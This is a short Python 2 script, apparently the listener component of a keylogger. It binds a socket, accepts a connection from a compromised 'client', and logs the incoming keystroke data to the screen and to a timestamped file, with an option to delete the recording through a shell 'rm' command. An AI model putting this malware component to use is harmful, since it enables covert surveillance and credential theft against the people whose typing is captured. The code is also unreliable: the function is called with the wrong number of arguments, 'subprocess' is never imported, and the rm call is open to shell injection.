#!/usr/bin/python
from __future__ import print_function
import socket
import sys
from threading import Thread
import time

def KeyStroke(HOST,PORT,BYTES,CURRENT_CLIENT):
  try:
    PORT=int(PORT)
    BYTES=int(BYTES)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT+8))
    s.listen(1)  
    print ("LISTEN : ",HOST,PORT+8)
    con, addr = s.accept()
    print ("GOT : ",addr)
    total=''
    OUTPUT_FILENAME = CURRENT_CLIENT+" "+time.strftime("%Y-%m-%d %H-%M-%S", time.localtime())
    f=open(OUTPUT_FILENAME+".txt","w")
    while True:
      data = con.recv(BYTES)
      print(data,end='')
      f.write(data)
    f.close()
  except:
    f.close()
    con.send('1')
    cmd=raw_input('Wanna Keep Recording?(y/n)')
    if(cmd=='n'):
      cmd=subprocess.Popen("rm '"+OUTPUT_FILENAME+"'",shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
      output=cmd.stdout.read()+cmd.stderr.read()
      print (output)
    s.close()
    return
try:
  #KeyStroke("172.31.77.183",2000,"lol")
  KeyStroke(sys.argv[1],sys.argv[2],sys.argv[3])
except Exception,e:
  print ("Exception :",e)
